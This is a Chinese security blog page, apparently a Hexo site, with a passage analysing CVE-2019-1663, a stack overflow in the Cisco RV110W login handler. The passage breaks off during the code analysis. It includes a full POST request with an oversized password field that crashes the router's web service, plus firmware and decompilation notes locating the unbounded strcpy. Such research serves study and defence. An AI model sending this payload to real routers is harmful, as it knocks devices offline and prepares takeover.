@@ -1,0 +1,833 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Cisco_RV110W_堆栈缓冲区溢出漏洞分析和利用 | Tig3rHu&#39;s Blog</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="Cisco_RV110W_堆栈缓冲区溢出漏洞分析和利用 | Tig3rHu&#39;s Blog">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Tig3rHu&#39;s Blog">
+<meta property="og:url" content="https://tig3rhu.github.io/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/2023-08-06.html">
+<meta property="og:site_name" content="Tig3rHu&#39;s Blog">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-12-18T09:30:05.460Z">
+<meta property="article:modified_time" content="2023-08-06T14:24:36.000Z">
+<meta property="article:author" content="Tig3rHu">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-light.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 7.0.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/avatar.jpg"/>
+</a>
+<div class="author">
+    <span>Tig3rHu</span>
+</div>
+
+<div class="icon">
+    
+        
+            <a title="rss"
+               href="/atom.xml"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-rss"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="github"
+               href="https://github.com/yelog"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="facebook"
+               href="https://www.facebook.com/faker.tops"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-facebook"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+    
+        
+            <a title="instagram"
+               href="https://www.facebook.com/faker.tops"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-instagram"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="reddit"
+               href="https://www.reddit.com/user/yelog/"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-reddit"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="weibo"
+               href="http://weibo.com/u/2307534817"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-weibo"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="jianshu"
+               href="https://www.jianshu.com/u/ff56736de7cf"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-jianshu"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="zhihu"
+               href="https://www.zhihu.com/people/jaytp/activities"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-zhihu"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+            <a title="oschina"
+               href="https://my.oschina.net/yelog"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-oschina"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+            <a title="email"
+               href="mailto:jaytp@qq.com"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-email"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="qq"
+               href="http://wpa.qq.com/msgrd?v=3&uin=872336115&site=qq&menu=yes"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-qq"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="kugou"
+               href="https://www.kugou.com/"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-kugou"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="neteasemusic"
+               href="https://music.163.com/#/user/home?id=88151013"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-neteasemusic"></use>
+                    </svg>
+                
+            </a>
+        
+    
+</div>
+
+
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="All">All
+            
+                <small>(19)</small>
+            
+        </div>
+    </li>
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+            
+    </div>
+    <div>
+        
+            <a class="about  hasFriend  site_url"
+               
+               href="/about">About</a>
+        
+        <a style="width: 50%"
+                
+                                           class="friends">Friends</a>
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="19">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        Links
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">All</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+    </div>
+
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        
+        <a  class="All "
+           href="/2024/01/03/67__%E9%80%86%E5%90%91__%E5%A9%9A%E7%A4%BC%E7%BA%AAAPP/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="apk逆向__婚礼纪逆向">apk逆向__婚礼纪逆向</span>
+            <span class="post-date" title="2024-01-03 23:51:59">2024/01/03</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/01/02/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Android各种机型刷机踩坑记录">Android各种机型刷机踩坑记录</span>
+            <span class="post-date" title="2024-01-02 23:08:52">2024/01/02</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/01/02/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="apk逆向__懒人驾考去会员">apk逆向__懒人驾考去会员</span>
+            <span class="post-date" title="2024-01-02 22:42:38">2024/01/02</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/01/02/66__%E9%80%86%E5%90%91_%E6%BB%B4%E7%AD%94%E6%B8%85%E5%8D%95%E5%8E%BB%E4%BC%9A%E5%91%98/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="apk逆向__滴答清单去会员">apk逆向__滴答清单去会员</span>
+            <span class="post-date" title="2024-01-02 22:34:09">2024/01/02</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2023/12/18/45__%E8%93%9D%E7%89%99%20sniff%20&%20CTF/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="蓝牙sniff&amp;CTF&amp;develop">蓝牙sniff&amp;CTF&amp;develop</span>
+            <span class="post-date" title="2023-12-18 17:30:59">2023/12/18</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2023/12/18/22_%E4%BD%BF%E7%94%A8LD_PROLOAD_%E8%BF%9B%E8%A1%8Chook/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Linux 使用LD_PRELOAD 进行hook">Linux 使用LD_PRELOAD 进行hook</span>
+            <span class="post-date" title="2023-12-18 17:19:56">2023/12/18</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2023/12/18/3__QiLing_%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="QiLing 框架学习WriteUp">QiLing 框架学习WriteUp</span>
+            <span class="post-date" title="2023-12-18 17:12:42">2023/12/18</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2023/12/18/mips%E6%9E%B6%E6%9E%84___%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="mips架构堆栈缓冲区溢出调试与利用">mips架构堆栈缓冲区溢出调试与利用</span>
+            <span class="post-date" title="2023-12-18 16:47:08">2023/12/18</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2023/12/17/NetGear%20R7000P%20%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="NetGear R7000P 路由器栈溢出漏洞硬件调试与分析">NetGear R7000P 路由器栈溢出漏洞硬件调试与分析</span>
+            <span class="post-date" title="2023-12-17 16:06:42">2023/12/17</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2023/12/16/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="NetGear_夜鹰_RAX40V2_设备与固件分析">NetGear_夜鹰_RAX40V2_设备与固件分析</span>
+            <span class="post-date" title="2023-12-16 20:57:42">2023/12/16</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2023/12/16/CVE-2021-20090(%E5%8D%8E%E7%A1%95DSL-AC3100)%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="CVE-2021-20090 身份验证绕过漏洞分析">CVE-2021-20090 身份验证绕过漏洞分析</span>
+            <span class="post-date" title="2023-12-16 20:46:07">2023/12/16</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2023/12/16/NetGear_DGN2200v1%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="NetGear__DNG2200v1系列漏洞分析">NetGear__DNG2200v1系列漏洞分析</span>
+            <span class="post-date" title="2023-12-16 20:34:25">2023/12/16</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2023/12/16/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Linksys EA6100 固件解密过程">Linksys EA6100 固件解密过程</span>
+            <span class="post-date" title="2023-12-16 20:20:43">2023/12/16</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2023/12/15/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Cisco_RV110W_堆栈缓冲区溢出漏洞分析和利用">Cisco_RV110W_堆栈缓冲区溢出漏洞分析和利用</span>
+            <span class="post-date" title="2023-12-15 23:01:41">2023/12/15</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2023/12/15/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="TP-Link WR841n 路由器多个缓冲区溢出漏洞复现">TP-Link WR841n 路由器多个缓冲区溢出漏洞复现</span>
+            <span class="post-date" title="2023-12-15 22:52:18">2023/12/15</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2023/12/15/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="USG310_4.70_固件解密分析">USG310_4.70_固件解密分析</span>
+            <span class="post-date" title="2023-12-15 22:47:02">2023/12/15</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2023/12/15/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="github 博客搭建记录">github 博客搭建记录</span>
+            <span class="post-date" title="2023-12-15 17:58:11">2023/12/15</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2023/12/15/Cisco%20Rv160%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Cisco Rv160 远程命令执行漏洞分析">Cisco Rv160 远程命令执行漏洞分析</span>
+            <span class="post-date" title="2023-12-15 17:01:20">2023/12/15</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2023/12/15/hello-world/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Hello World">Hello World</span>
+            <span class="post-date" title="2023-12-15 15:15:35">2023/12/15</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-Cisco_RV110W_堆栈缓冲区溢出漏洞分析" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">Cisco_RV110W_堆栈缓冲区溢出漏洞分析和利用</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2023-12-17 22:12:42'>2023-12-15 23:01</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            Views 👀 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Cisco-RV110W-%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">Cisco_RV110W_堆栈缓冲区溢出漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91"><span class="toc-text">0x02 漏洞触发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-text">0x02 固件分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%BC%8F%E6%B4%9E%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">0x03 漏洞远程调试&amp;漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%EF%BC%89%E5%8A%AB%E6%8C%81PC"><span class="toc-text">1）劫持PC</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%AD%E6%96%AD%E5%88%86%E6%9E%90"><span class="toc-text">中断分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%EF%BC%89-%E8%AE%A1%E7%AE%97%E5%81%8F%E7%A7%BB%E9%87%8F"><span class="toc-text">2） 计算偏移量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%EF%BC%89%E7%A1%AE%E5%AE%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%80%94%E5%BE%84"><span class="toc-text">3）确定漏洞利用途径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%EF%BC%89-%E6%9E%84%E9%80%A0%E6%9C%80%E7%BB%88%E7%9A%84ROP-Chain"><span class="toc-text">4） 构造最终的ROP Chain</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-exploit-%E6%B5%8B%E8%AF%95"><span class="toc-text">5)  exploit 测试</span></a></li></ol></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Cisco-RV110W-堆栈缓冲区溢出漏洞分析"><a href="#Cisco-RV110W-堆栈缓冲区溢出漏洞分析" class="headerlink" title="Cisco_RV110W_堆栈缓冲区溢出漏洞分析"></a>Cisco_RV110W_堆栈缓冲区溢出漏洞分析</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p> 本篇文章是针对Cisco RV110W 设备的一次栈溢出漏洞分析与复现。</p>
+<p>漏洞通告：<a target="_blank" rel="noopener" href="https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-20190227-rmi-cmd-ex.html">https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-20190227-rmi-cmd-ex.html</a></p>
+<h2 id="0x02-漏洞触发"><a href="#0x02-漏洞触发" class="headerlink" title="0x02 漏洞触发"></a>0x02 漏洞触发</h2><p>漏洞编号：CVE-2019-1663</p>
+<p>漏洞固件版本：Cisco RV110W&lt;1.2.2.1</p>
+<p>UART 串口接入设备shell，查看设备的端口开放情况，并且cisco的web服务是可以访问，开启了443端口</p>
+<p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20221115152433365.png" alt="image-20221115152433365"></p>
+<p>登录，pwd的值使用MD5 将密码进行加密</p>
+<p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210726141729042.png" alt="image-20210726141729042"></p>
+<p>将payloads 更改为，并且发送请求的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /login.cgi HTTP/1.1</span><br><span class="line">Host: 192.168.1.1</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 556</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;92&quot;, &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Google Chrome&quot;;v=&quot;92&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: https://192.168.1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: https://192.168.1.1/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: XSRF_TOKEN=1222440606; mlap=RGVmYXVsdDM6Ojo6Y2lzY28=</span><br><span class="line"></span><br><span class="line">submit_button=login&amp;submit_type=&amp;gui_action=&amp;wait_time=0&amp;change_action=&amp;enc=1&amp;user=cisco+&amp;pwd=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZZZZ&amp;sel_lang=EN</span><br></pre></td></tr></table></figure>
+
+<p>现在我们再次来看设备的web 443服务，可以很明显的看到设备的端口已经down 了。并且设备的web 的服务也无法访问。初步判断在登录的pwd 值处发生了堆栈的缓冲区溢出的漏洞。</p>
+<p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210726141951659.png" alt="image-20210726141951659"></p>
+<h2 id="0x02-固件分析"><a href="#0x02-固件分析" class="headerlink" title="0x02 固件分析"></a>0x02 固件分析</h2><p>由于思科的固件都是公开的，因此可以直接从思科的support站上下载固件，接着使用binwalk 解开固件包，固件使用的是Squashfs 最常见的嵌入式文件系统格式。</p>
+<p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20221115152840681.png" alt="image-20221115152840681"></p>
+<p>通过固件内的二进制文件获取获取指令架构的相关信息，固件为mips 32位小端的指令架构。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shayuhuajiao@ubuntu ~/i/g/_/squashfs-root&gt; file sbin/rc</span><br><span class="line">sbin/rc: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br><span class="line">shayuhuajiao@ubuntu ~/i/g/_/squashfs-root&gt; file bin/busybox </span><br><span class="line">bin/busybox: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br></pre></td></tr></table></figure>
+
+<p>根据披露的漏洞信息和漏洞触发行为，漏洞产生在http 服务上，因此可以很快的定位提供http服务的 httpd 二进制文件，该文件在  &#x2F;usr&#x2F;sbin&#x2F;httpd  中</p>
+<p>使用ghidra 导入httpd</p>
+<p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20221115155911402.png" alt="image-20221115155911402"></p>
+<p><strong>漏洞点的流程</strong></p>
+<p>log_in_cgi() –&gt; login_check() —&gt; valid_user()</p>
+<p>漏洞函数是在vailid_user(char *pcParm1,char *pcParm2,char *pcParm3,int iParm4)函数，parm1 和 parm2 分别是输入的user 和password 的值，另外parm4 是enc的值。漏洞函数的传参下面会分析，这个函数中具体的漏洞点如下，首先程序会判断enc的值是否是1 ，如果不是，那就对比”enc&#x3D;” 字符串，一般来说都能触发 strcpy 函数。strcpy 函数会将pcParm2 的值复制到acStack109中，并且没有对pcParm2的长度没有限制，因此会造成acStack109[69] 的内存单元无法容纳大长度的字节，从而造成缓冲区溢出的漏洞。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span 